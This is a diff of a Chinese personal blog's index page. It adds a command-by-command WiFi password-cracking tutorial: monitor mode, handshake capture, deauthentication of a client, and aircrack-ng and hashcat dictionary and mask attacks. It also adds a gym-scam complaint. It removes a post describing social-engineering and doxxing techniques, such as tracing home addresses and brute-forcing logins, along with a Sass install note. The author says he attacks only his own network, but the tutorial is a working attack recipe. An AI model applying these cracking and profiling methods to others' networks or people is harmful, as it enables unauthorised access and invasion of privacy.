@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 4.2.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -156,6 +156,250 @@
             
 
   <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Louis Yang">
+      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louis Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">Kali Linux 高效破解Wifi密码</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-10-22 18:02:30" itemprop="dateCreated datePublished" datetime="2018-10-22T18:02:30+08:00">2018-10-22</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/22/Kali-Linux-高效破解Wifi密码/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>起因是最近买了个Wifi Pineapple，感觉无线安全挺有意思，再加上网上破解Wifi的教程要么跑不起来、要么不是很详细，所以就准备写这篇文章。</p>
+</blockquote>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><blockquote>
+<p>1.支持监听模式的无线网卡，我这里是小米的无线网卡</p>
+<p>2.Kali Linux，我这里是VMware虚拟机</p>
+</blockquote>
+<ol>
+<li><p>挂载网卡</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/0.png" alt="pic"></p>
+</li>
+<li><p>下载密码字典</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较常用的密码字典，不是很大，国内Wifi成功率不会很高</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><ol>
+<li><p>检查网卡是否支持监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现为wlan0的网卡则支持</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启后名称变成了wlan0mon</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索附近的网络</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里使用自己的Wifi作为对象，私自破解他人Wifi属于违法行为</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/1.png" alt="pic"></p>
+</li>
+<li><p>抓取握手包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 --bssid 74:7D:24:77:2B:6F -w ~/ wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 为信道，这里主要是需要包含密码信息的数据包</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/2.png" alt="pic"></p>
+</li>
+<li><p>攻击，使目标设备断开重新连接，以便获取握手包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 74:7D:24:77:2B:6F -c 84:89:AD:6F:60:6F wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -a Wifi热点的BSSID -c 攻击设备的MAC地址</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/3.png" alt="pic"></p>
+</li>
+<li><p>耐心等待设备重新连接以抓取认证数据包</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/4.png" alt="pic"></p>
+<blockquote>
+<p>成功后可终止命令。</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/5.png" alt="pic"></p>
+</blockquote>
+</li>
+<li><p>暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b 74:7D:24:77:2B:6F -w rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/6.png" alt="pic"></p>
+<blockquote>
+<p>这里已经破解成功了，由于自己的密码并不是很复杂，所以很快就完成了破解，实际使用中使用这个密码字典成功率不会很高，需要使用更大的字典才行。</p>
+<p>但更大的字典意味着破解速度会被无限拉长。。</p>
+<p>所以下面使用Hashcat来破解密码，实际测试下来，速度确实快了几倍。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="使用Hashcat破解"><a href="#使用Hashcat破解" class="headerlink" title="使用Hashcat破解"></a>使用Hashcat破解</h2><blockquote>
+<p>官方介绍是：Hashcat是当前速度最快、最先进的开源密码恢复工具。</p>
+<p>我这边测试的是使用GPU破解，所以将环境转移到了Windows下。</p>
+</blockquote>
+<ol>
+<li><p>格式转换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat-utils/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载转换工具，将<span class="built_in">cap</span>文件转换为hccapx文件</span></span><br><span class="line"> ./cap2hccapx.exe -01.cap 01.hccapx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/7.png" alt="pic"></p>
+</li>
+<li><p>使用密码字典破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载 Hashcat，开始破解</span></span><br><span class="line"> .\hashcat64.exe -m 2500 01.hccapx .\rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/8.png" alt="pic"></p>
+<blockquote>
+<p>完成，速度超快！</p>
+</blockquote>
+</li>
+<li><p>使用掩码破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 知道密码长度使用此模式还行，如果不知道。。</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx -1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line">1 ?l?u ?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定11位</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx --increment --increment-min=8 --increment-max=15 -1 ?a ?1?1?1?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从8位破解到15位,超高难度</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显卡不行，所以就不测试该模式的时间了</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常见问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Device #1: WARNING! Kernel exec timeout is not disabled.</span><br><span class="line">             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.</span><br><span class="line">             To disable the timeout, see: https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch</span><br><span class="line">           </span><br><span class="line"># 参考 https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch 新建 wddm_timeout_patch.reg 文件，内容如下，保存后双击运行导入注册表。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers]</span><br><span class="line">&quot;TdrLevel&quot;&#x3D;dword:00000000</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Louis Yang">
+      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louis Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/" class="post-title-link" itemprop="url">一兆韦德的无耻套路</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-10-11 10:28:24" itemprop="dateCreated datePublished" datetime="2018-10-11T10:28:24+08:00">2018-10-11</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/11/一兆韦德的无耻套路/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>国庆过后，又胖了一圈。。同时感觉自己身体不太好，就想着办张健身卡。</p>
+<p>因为种种原因所以选择在二手平台上看转卡信息，结果无一例外都是人外出，委托给健身房，让自己去办理之类的。</p>
+<p>然后就网上查了下，发现这些全是套路，到了之后会以转让费或者人不在之类的做借口忽悠你办店里的套餐。如果你坚持办，ok，没问题，他们会在一段时间后把卡停掉，然后以公司卡违规之类的来让你升级卡片。</p>
+<p>套路多多，逐放弃转卡这一渠道，然后无意中看到全新卡，价格在转卡和门店价格之间，然后直接去办理就好，就放松了警惕，约好下班之后去办理。</p>
+<p><img src="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/1.jpg" alt></p>
+<p>到达门店之后，确认价格、时间等，这时候套路来了，它会拿来入会表格让你填，然后告诉你一些无关紧要的问题，比如无法转卡、无法停卡之类的小问题，让你放松警惕。</p>
+<p>表示这些没问题以后，会让你付款，付完款之后，会让店里的经理给你讲一些其他的问题，这时候经理就会说这个卡是公司卡，然后无法补卡，公司可以随时中止之类的条款。</p>
+<p>这个时候正常人肯定会想，这些事先没给说啊，没有知情权，那我不办了可以吧？可是事情并没有那么简单，然后两个人就开始双簧了，工作人员说这个不是我们的，是它们公司的，所以要去找它们。然后卖卡的人又会说已经报到公司去了，不能退。而且经理态度恶劣，说随便你用什么手段解决（录音可以听到）。</p>
+<p>这时候问题来了，POS机刷卡信息显示的是健身房，说是别的公司？会让一个不相干的拿来POS机？后来证明这个所谓公司的人其实就是店里的。</p>
+<p><img src="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/2.jpg" alt></p>
+<p>这个时候如果你态度强硬，表示会曝光并且去投诉的话，它就会服软说可以退，但是要几个月的时间，并且需要再次来店里确认退款手续。但是，这个时候主动权已经完全不在你手中了，既然说退款，那么有关部门也未必会管，而且具体多久就完全不能预计了。</p>
+<p>这里肯定会有人洗地了，什么价格很明显不合理啊、想占便宜活该被骗啊、谁叫你事先没问明白之类的，呵呵送给你。</p>
+<p>这个时候所谓经理就开始推销套餐，说可以把这个钱转过去，转成正式套餐，只需要付款剩下的部分，最终的结果就是花了近三倍的价格办了几年卡。。</p>
+<p>{ <a href="http://p20g9o3r4.bkt.clouddn.com/1.mp3}" target="_blank" rel="noopener">http://p20g9o3r4.bkt.clouddn.com/1.mp3}</a></p>
+<p>说到最后这张卡，我是不准备退的，写出来主要是防止更多的人上当受骗。还有就是态度问题：办卡的时候你是爷，办了卡之后它是爷，简直一百八十度转弯。没错，约定好的承诺没完全兑现，一直拖着。</p>
+<p>除此之外还有几点：第一点是不知道以这种近乎胁迫的形式签的合同有没有效？第二是也没有那么多的精力来搞维权，相信它们手段肯定还是有一套的；第三就是我确实也需要一张健身卡，只是手段令人十分不齿罢了。</p>
+<p>写的有点乱，本以为小心翼翼，结果套路防不胜防。避免一些不必要的麻烦，所以图片和录音都是经过处理的 。如果能让无良商家收敛一点也是极好的。</p>
+<p>最后，这些无良商家真的就没人出来管管？？</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
         
   
   
@@ -1040,180 +1284,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2016/08/26/%E6%B5%85%E8%B0%88%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Louis Yang">
-      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Louis Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/08/26/%E6%B5%85%E8%B0%88%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E7%94%A8/" class="post-title-link" itemprop="url">浅谈社会工程学的几种运用</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-08-26 10:55:59" itemprop="dateCreated datePublished" datetime="2016-08-26T10:55:59+08:00">2016-08-26</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/2016/08/26/%E6%B5%85%E8%B0%88%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E7%94%A8/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/26/浅谈社会工程学的几种运用/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是社会工程学（Social-Engineering）？"><a href="#什么是社会工程学（Social-Engineering）？" class="headerlink" title="什么是社会工程学（Social Engineering）？"></a>什么是社会工程学（Social Engineering）？</h2><blockquote>
-<p>社会工程学是黑客米特尼克悔改后在《欺骗的艺术》中所提出的，是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段。</p>
-</blockquote>
-<p>写这篇文章的起因是因为看了《到山东女孩被骗9900元学费，两天后心脏骤停离世》的新闻，很是痛心，故写下这篇文章让大家了解社工所带来的危害。</p>
-<h2 id="一、根据-QQ-所能收集到的信息"><a href="#一、根据-QQ-所能收集到的信息" class="headerlink" title="一、根据 QQ 所能收集到的信息"></a>一、根据 QQ 所能收集到的信息</h2><p>你可能会想 QQ 这么平常的东西，可以收集到什么信息呢。不过，这样想可就大错特错了，下面就讲一下我的一些思路。</p>
-<p>一、根据 QQ 在线状态来判断此刻你的位置。比如，WIFI 表示在家，由 WIFI 变成 3/4G 则表示你可能刚出门，变成 2G 很可能你在地铁。</p>
-<p>二、通过你的 QQ 空间所发表的动态来判断你的性格、现在所处的一个状态以及生活的大致范围。</p>
-<p>三、根据 QQ 空间的留言、评论、访客记录等等，可以推断出你的职业、圈子、人际关系等，还可以根据六度人脉理论写个小程序，采集数据，分析你朋友的动态获取更详细的信息。</p>
-<p>四、之前有过 QQ 群关系的泄露，可以查看加入的群、群昵称、位置等数据，那么就可以根据这些资料来判断你之前是种怎样的性格、生活状态、地理位置、所在学校以及兴趣爱好，以此来了解伪装你的同学朋友进行定向诈骗。</p>
-<p>五、社工库和搜索引擎可以查到你注册的一些网站资料以及密码，自然也可以根据密码和注册网站的类型来推断出你的一些其他资料，比如现在密码的大致范围、生日等等。</p>
-<p>六、在REG007这个网站呢，可以查到你注册了那些网站，那么以这些信息又可以确定你的性格资料及常用网站。</p>
-<p>七、根据你的出生地和出生年月及姓名可以到一个叫做 “身份通” 的网站来通过程序遍历身份证后四位获取你的详细住址，精确到门牌号。</p>
-<p>OK，那么到现在为止几乎知道了你最近几年的所有信息（姓名、电话、生日、地址、常用密码、人脉、身份证、性格、职业等等），其实途径还有很多，比如头像、照片搜索获取在网上所遗留的信息；根据注册的网站和大致的密码范围进行密码爆破，获取仅限个人所见的详细资料；钓鱼欺骗等等等等，这么看来危害还是挺大的吧。</p>
-<h2 id="二、根据网站所能搜集的企业信息"><a href="#二、根据网站所能搜集的企业信息" class="headerlink" title="二、根据网站所能搜集的企业信息"></a>二、根据网站所能搜集的企业信息</h2><p>如果我说根据网站就可以入侵企业内网你信么？你可能会说这有什么难的，找安全漏洞啊，什么SQL注入、命令执行、权限配置不当等等的一些漏洞，找到不就可以进入企业内网了？当然，这些当然可以，但是这篇文章讲的不是漏洞的利用，这里只讲一些利用社工所能收集到的信息以及所能达到的目的。</p>
-<p>一、根据Whois查询域名联系人邮箱电话等基本信息，如果设置了隐私保护，则记下域名注册服务商，后续会用到。</p>
-<p>二、查询网站页面的联系方式、地址，一般在网站的关于我们或联系我们页面可以看到，收集到信息后去搜索引擎或社工库查询相关密码以及基本信息。</p>
-<p>三、查询域名的DNS解析记录，可以查询到一些后台管理、邮箱、VPN等管理系统。</p>
-<p>四、搜索引擎搜索域名和邮箱关键字，获取更多联系人及内部员工，登录上述查找到的系统进行爆破，成功后可获取更多敏感信息：VPN、通讯录、相关平台地址密码等等。</p>
-<p>五、去公司实际地址伪装电信工作人员或访客进入公司大楼收集信息、WIFI中间人攻击（相信爆破WIFI密码这种事情应该不难）获取内部资料等等，什么？进不去？那就买个树莓派插上电源和无线网卡放到某种东西中然后当礼物送进去….</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然，以上说的一些运用只是相对理想的状态，还有很多很多方法可以尝试。</p>
-<p>最后，思路最重要。</p>
-<p>最后的最后，这篇文章只是随便写写..</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2016/06/02/Sass%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Louis Yang">
-      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Louis Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/06/02/Sass%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">Sass安装及常用命令</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-06-02 11:16:50" itemprop="dateCreated datePublished" datetime="2016-06-02T11:16:50+08:00">2016-06-02</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/2016/06/02/Sass%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/06/02/Sass安装及常用命令/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="安装Sass："><a href="#安装Sass：" class="headerlink" title="安装Sass："></a>安装Sass：</h3><p>Mac可直接执行，Windows需先安装Ruby</p>
-<p>将gem源改为淘宝服务器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gem sources -l  </span><br><span class="line">gem sources --remove https:&#x2F;&#x2F;rubygems.org&#x2F;    </span><br><span class="line">gem sources -a http:&#x2F;&#x2F;ruby.taobao.org&#x2F;  </span><br><span class="line">gem sources -l</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install sass</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;编译所有文件 in文件夹 out目标文件夹</span><br><span class="line">sass --update in:out </span><br><span class="line">&#x2F;&#x2F;监控文件，有更改则自动编译</span><br><span class="line">sass --watch style.scss:style.css  </span><br><span class="line">&#x2F;&#x2F;查看帮助</span><br><span class="line">sass --help</span><br><span class="line">&#x2F;&#x2F;css文件转换为scss</span><br><span class="line">sass-convert in.css out.scss</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1284,7 +1354,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1327,13 +1397,13 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Louis Yang</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
   </div>
   <span class="post-meta-divider">|</span>
   <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
